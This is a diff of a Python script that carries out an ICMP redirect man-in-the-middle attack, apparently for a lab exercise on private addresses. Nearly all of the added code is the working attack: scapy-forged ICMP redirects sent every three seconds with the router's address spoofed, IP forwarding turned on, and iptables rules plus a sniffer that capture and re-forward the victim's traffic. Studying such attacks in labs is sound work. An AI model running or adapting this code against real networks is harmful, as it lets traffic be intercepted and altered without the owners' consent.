@@ -1,183 +1,277 @@
 #!/usr/bin/env python3
 """
 ICMP Redirect Attack Implementation
-This script demonstrates an ICMP redirect attack by crafting raw packets.
+This script performs an ICMP redirect attack to intercept victim's traffic.
+
+Attack Flow:
+1. Monitor victim's traffic to external destinations
+2. Send ICMP redirect message to victim
+3. Redirect victim's traffic through attacker
+4. Optionally intercept/modify the traffic
 """
 
 import socket
 import struct
 import time
 import threading
-import select
-from util import PacketCrafter, NetworkConfig, parse_ip_header, format_ip_address
+import sys
+import subprocess
+from scapy.all import *
 
 class ICMPRedirectAttacker:
-    """Main ICMP Redirect Attack class"""
-    
     def __init__(self):
+        self.victim_ip = "192.168.1.10"
+        self.router_ip = "192.168.1.1"
+        self.attacker_ip = "192.168.1.20"
+        self.external_target = "10.0.0.100"
+        self.interface = "eth0"
         self.running = False
-        self.packet_crafter = PacketCrafter()
         
-    def get_network_interface(self):
-        """Get the network interface name dynamically"""
+        print(f"[*] ICMP Redirect Attacker initialized")
+        print(f"[*] Victim IP: {self.victim_ip}")
+        print(f"[*] Router IP: {self.router_ip}")
+        print(f"[*] Attacker IP: {self.attacker_ip}")
+        print(f"[*] External Target: {self.external_target}")
+        
+    def enable_ip_forwarding(self):
+        """Enable IP forwarding so we can act as a router"""
         try:
-            import os
-            interfaces = os.listdir('/sys/class/net/')
-            # Look for eth interface (default in containers)
-            for iface in interfaces:
-                if iface.startswith('eth'):
-                    return iface
-            # Fallback to first non-loopback interface
-            for iface in interfaces:
-                if iface != 'lo':
-                    return iface
-            return 'eth0'  # Default fallback
-        except:
-            return 'eth0'
-
-    def sniff_packets(self):
-        """Sniff packets to detect victim's traffic to target"""
+            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
+                         capture_output=True, check=True)
+            print("[*] IP forwarding enabled")
+        except subprocess.CalledProcessError as e:
+            print(f"[!] Failed to enable IP forwarding: {e}")
+            
+    def get_victim_mac(self):
+        """Get victim's MAC address via ARP"""
         try:
-            interface = self.get_network_interface()
-            print(f"[*] Using network interface: {interface}")
+            # Send ARP request to get victim's MAC
+            arp_request = ARP(op=1, pdst=self.victim_ip)
+            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+            arp_request_broadcast = broadcast / arp_request
             
-            # Create raw socket for sniffing
-            sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
-            sniffer.bind((interface, 0))  # Bind to detected interface
+            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
             
-            print(f"[*] Starting packet sniffing on {interface}...")
+            if answered_list:
+                victim_mac = answered_list[0][1].hwsrc
+                print(f"[*] Victim MAC address: {victim_mac}")
+                return victim_mac
+            else:
+                print("[!] Could not determine victim's MAC address")
+                return None
+        except Exception as e:
+            print(f"[!] Error getting victim MAC: {e}")
+            return None
             
+    def monitor_victim_traffic(self):
+        """Send periodic ICMP redirects to redirect victim traffic"""
+        print(f"[*] Starting proactive ICMP redirect attack")
+        print(f"[*] Will send ICMP redirects every 3 seconds")
+        
+        try:
             while self.running:
-                ready = select.select([sniffer], [], [], 1.0)
-                if ready[0]:
-                    packet, addr = sniffer.recvfrom(65535)
-                    self.analyze_packet(packet)
+                # Send ICMP redirect for the external target
+                self.send_icmp_redirect_proactive()
+                
+                # Wait before next round
+                time.sleep(3)
+                
+        except Exception as e:
+            print(f"[!] Error in ICMP redirect attack: {e}")
+            
+    def send_icmp_redirect_proactive(self):
+        """Send proactive ICMP redirect without waiting for traffic"""
+        try:
+            print(f"[*] Sending ICMP redirect to victim...")
+            
+            # Create a more realistic original packet that would trigger redirect
+            # This simulates a packet the victim would send to the external target
+            fake_original = IP(src=self.victim_ip, dst=self.external_target) / ICMP(type=8, code=0, id=0x1234)
+            
+            # Create ICMP redirect packet (Type 5, Code 1 = Redirect for Host)
+            icmp_redirect = IP(src=self.router_ip, dst=self.victim_ip) / \
+                           ICMP(type=5, code=1, gw=self.attacker_ip) / \
+                           fake_original
+            
+            # Send the redirect packet
+            send(icmp_redirect, verbose=False)
+            
+            print(f"[+] ICMP redirect sent: {self.router_ip} -> {self.victim_ip}")
+            print(f"[+] Telling victim to use {self.attacker_ip} as gateway for {self.external_target}")
+            
+        except Exception as e:
+            print(f"[!] Error sending ICMP redirect: {e}")
+            
+            
+    def send_icmp_redirect(self, original_pkt):
+        """Send ICMP redirect message to victim"""
+        try:
+            print(f"[*] Sending ICMP redirect to victim...")
+            
+            # Create ICMP redirect packet
+            # ICMP Type 5 (Redirect), Code 1 (Redirect for Host)
+            icmp_redirect = IP(src=self.router_ip, dst=self.victim_ip) / \
+                           ICMP(type=5, code=1, gw=self.attacker_ip) / \
+                           original_pkt[IP]
+            
+            # Send the redirect packet
+            send(icmp_redirect, verbose=False)
+            
+            print(f"[*] ICMP redirect sent: Router {self.router_ip} tells victim {self.victim_ip}")
+            print(f"    to use gateway {self.attacker_ip} for destination {self.external_target}")
+            
+        except Exception as e:
+            print(f"[!] Error sending ICMP redirect: {e}")
+            
+    def setup_traffic_interception(self):
+        """Setup iptables rules to intercept and forward victim's traffic"""
+        try:
+            # Add iptables rules to intercept and log victim's traffic
+            rules = [
+                # Log intercepted packets
+                f"iptables -A FORWARD -s {self.victim_ip} -d {self.external_target} -j LOG --log-prefix 'INTERCEPTED: '",
+                # Forward victim's traffic to external target
+                f"iptables -A FORWARD -s {self.victim_ip} -d {self.external_target} -j ACCEPT",
+                # Enable NAT for forwarded traffic
+                f"iptables -t nat -A POSTROUTING -s {self.victim_ip} -d {self.external_target} -j MASQUERADE",
+            ]
+            
+            for rule in rules:
+                try:
+                    subprocess.run(rule.split(), capture_output=True, check=True)
+                    print(f"[*] Added iptables rule: {rule}")
+                except subprocess.CalledProcessError:
+                    pass  # Rule might already exist
                     
-        except PermissionError:
-            print("[!] Permission denied. Run as root or with CAP_NET_RAW capability")
         except Exception as e:
-            print(f"[!] Sniffing error: {e}")
-        finally:
-            sniffer.close()
-
-    def analyze_packet(self, packet):
-        """Analyze captured packet for attack opportunities"""
-        try:
-            # Parse Ethernet header (14 bytes)
-            eth_header = packet[:14]
-            eth_type = struct.unpack('!H', eth_header[12:14])[0]
+            print(f"[!] Error setting up traffic interception: {e}")
             
-            # Check if it's an IP packet
-            if eth_type == 0x0800:
-                ip_packet = packet[14:]
-                self.process_ip_packet(ip_packet)
+    def intercept_and_forward(self):
+        """Intercept victim's traffic and forward it (with optional modification)"""
+        print(f"[*] Starting traffic interception...")
+        
+        def forward_handler(pkt):
+            if not self.running:
+                return
+                
+            # Check if packet is from victim to external target
+            if (pkt.haslayer(IP) and 
+                pkt[IP].src == self.victim_ip and 
+                pkt[IP].dst == self.external_target):
+                
+                print(f"[*] Intercepted packet: {self.victim_ip} -> {self.external_target}")
+                
+                # Here you could modify the packet if needed
+                # For now, just forward it
+                
+                # Remove Ethernet header and forward as IP packet
+                if pkt.haslayer(Ether):
+                    ip_pkt = pkt[IP]
+                    send(ip_pkt, verbose=False)
+                    print(f"[*] Forwarded packet to {self.external_target}")
+                    
+        # Sniff for packets destined for external target
+        sniff(iface=self.interface, prn=forward_handler, store=0,
+              filter=f"src host {self.victim_ip} and dst host {self.external_target}",
+              stop_filter=lambda x: not self.running)
+              
+    def display_routing_info(self):
+        """Display current routing information (attacker only)"""
+        print("\n[*] Current routing information:")
+        
+        try:
+            # Show attacker's routing table  
+            print(f"\nAttacker ({self.attacker_ip}) routing table:")
+            result = subprocess.run(['ip', 'route', 'show'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print(result.stdout)
+            else:
+                print("Could not retrieve attacker's routing table")
+                
+            # Show ARP table
+            print(f"\nAttacker ARP table:")
+            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
+            if result.returncode == 0:
+                print(result.stdout)
+            else:
+                print("Could not retrieve ARP table")
                 
         except Exception as e:
-            print(f"[!] Packet analysis error: {e}")
-
-    def process_ip_packet(self, ip_packet):
-        """Process IP packet and check for attack opportunity"""
-        try:
-            # Parse IP header using utility function
-            ip_info = parse_ip_header(ip_packet)
+            print(f"[!] Error displaying routing info: {e}")
             
-            # Check if victim is trying to reach target
-            if ip_info['source_ip'] == NetworkConfig.VICTIM_IP and ip_info['destination_ip'] == NetworkConfig.TARGET_IP:
-                print(f"[+] Detected victim ({NetworkConfig.VICTIM_IP}) communicating with target ({NetworkConfig.TARGET_IP})")
-                self.launch_redirect_attack(ip_info['header_bytes'], ip_packet[20:])
-                
-        except Exception as e:
-            print(f"[!] IP packet processing error: {e}")
-
-    def launch_redirect_attack(self, original_ip_header, original_payload):
-        """Launch ICMP redirect attack"""
-        try:
-            print(f"[*] Launching ICMP redirect attack...")
-            
-            # Create ICMP redirect packet using utility function
-            icmp_redirect = self.packet_crafter.create_icmp_redirect_packet(
-                NetworkConfig.ATTACKER_IP,  # Redirect to attacker as new gateway
-                original_ip_header,
-                original_payload
-            )
-            
-            # Create IP header for redirect packet (router -> victim)
-            ip_header = self.packet_crafter.create_ip_header(
-                NetworkConfig.ROUTER_IP,    # Spoof as legitimate router
-                NetworkConfig.VICTIM_IP,    # Send to victim
-                NetworkConfig.IPPROTO_ICMP, # ICMP protocol
-                len(icmp_redirect)
-            )
-            
-            # Combine headers and payload
-            redirect_packet = ip_header + icmp_redirect
-            
-            # Send spoofed redirect packet
-            self.packet_crafter.send_raw_packet(redirect_packet, NetworkConfig.VICTIM_IP)
-            
-            print(f"[+] ICMP redirect sent: {NetworkConfig.ROUTER_IP} -> {NetworkConfig.VICTIM_IP}")
-            print(f"[+] Redirecting traffic to attacker: {NetworkConfig.ATTACKER_IP}")
-            
-        except Exception as e:
-            print(f"[!] Redirect attack error: {e}")
-
-    def send_spoofed_packet(self, packet, target_ip):
-        """Send spoofed packet using raw socket"""
-        try:
-            self.packet_crafter.send_raw_packet(packet, target_ip)
-        except Exception as e:
-            print(f"[!] Packet sending error: {e}")
-
     def start_attack(self):
         """Start the ICMP redirect attack"""
+        print("\n" + "="*60)
+        print("Starting ICMP Redirect Attack")
         print("="*60)
-        print("ICMP Redirect Attack Demonstration")
-        print("="*60)
-        print(f"Victim IP: {NetworkConfig.VICTIM_IP}")
-        print(f"Router IP: {NetworkConfig.ROUTER_IP}")
-        print(f"Attacker IP: {NetworkConfig.ATTACKER_IP}")
-        print(f"Target IP: {NetworkConfig.TARGET_IP}")
-        print("="*60)
+        
+        # Enable IP forwarding
+        self.enable_ip_forwarding()
+        
+        # Setup traffic interception rules
+        self.setup_traffic_interception()
+        
+        # Get victim's MAC address
+        victim_mac = self.get_victim_mac()
+        
+        # Display current routing info
+        self.display_routing_info()
         
         self.running = True
         
-        # Start packet sniffing in separate thread
-        sniffer_thread = threading.Thread(target=self.sniff_packets)
-        sniffer_thread.daemon = True
-        sniffer_thread.start()
-        
         try:
-            print("[*] Attack started. Press Ctrl+C to stop...")
+            # Start traffic monitoring in a separate thread
+            monitor_thread = threading.Thread(target=self.monitor_victim_traffic)
+            monitor_thread.daemon = True
+            monitor_thread.start()
+            
+            # Start traffic interception in another thread
+            intercept_thread = threading.Thread(target=self.intercept_and_forward)
+            intercept_thread.daemon = True
+            intercept_thread.start()
+            
+            print(f"\n[*] Attack started! Monitoring victim traffic...")
+            print(f"[*] Waiting for victim to send packets to {self.external_target}")
+            print(f"[*] Press Ctrl+C to stop the attack")
+            
+            # Keep the main thread alive
             while self.running:
                 time.sleep(1)
+                
         except KeyboardInterrupt:
-            print("\n[*] Stopping attack...")
+            print(f"\n[*] Attack stopped by user")
             self.running = False
-
-    def manual_redirect(self):
-        """Send manual ICMP redirect (for testing)"""
-        print("[*] Sending manual ICMP redirect...")
-        
-        # Create fake original packet (victim -> target)
-        fake_ip_header = self.packet_crafter.create_ip_header(
-            NetworkConfig.VICTIM_IP, NetworkConfig.TARGET_IP, NetworkConfig.IPPROTO_ICMP, 8
-        )
-        fake_payload = b'\x08\x00\xf7\xff\x00\x00\x00\x00'  # ICMP echo request
-        
-        self.launch_redirect_attack(fake_ip_header, fake_payload)
+            
+    def cleanup(self):
+        """Clean up iptables rules"""
+        try:
+            cleanup_rules = [
+                f"iptables -D FORWARD -s {self.victim_ip} -d {self.external_target} -j LOG --log-prefix 'INTERCEPTED: '",
+                f"iptables -D FORWARD -s {self.victim_ip} -d {self.external_target} -j ACCEPT",
+                f"iptables -t nat -D POSTROUTING -s {self.victim_ip} -d {self.external_target} -j MASQUERADE",
+            ]
+            
+            for rule in cleanup_rules:
+                try:
+                    subprocess.run(rule.split(), capture_output=True)
+                except:
+                    pass  # Rule might not exist
+                    
+            print("[*] Cleanup completed")
+            
+        except Exception as e:
+            print(f"[!] Error during cleanup: {e}")
 
 def main():
-    """Main function"""
-    import sys
+    print("ICMP Redirect Attack Demonstration")
+    print("==================================")
     
-    if len(sys.argv) > 1 and sys.argv[1] == "--manual":
-        # Manual mode for testing
-        attacker = ICMPRedirectAttacker()
-        attacker.manual_redirect()
-    else:
-        # Automatic sniffing mode
-        attacker = ICMPRedirectAttacker()
+    attacker = ICMPRedirectAttacker()
+    
+    try:
         attacker.start_attack()
+    finally:
+        attacker.cleanup()
 
 if __name__ == "__main__":
     main()
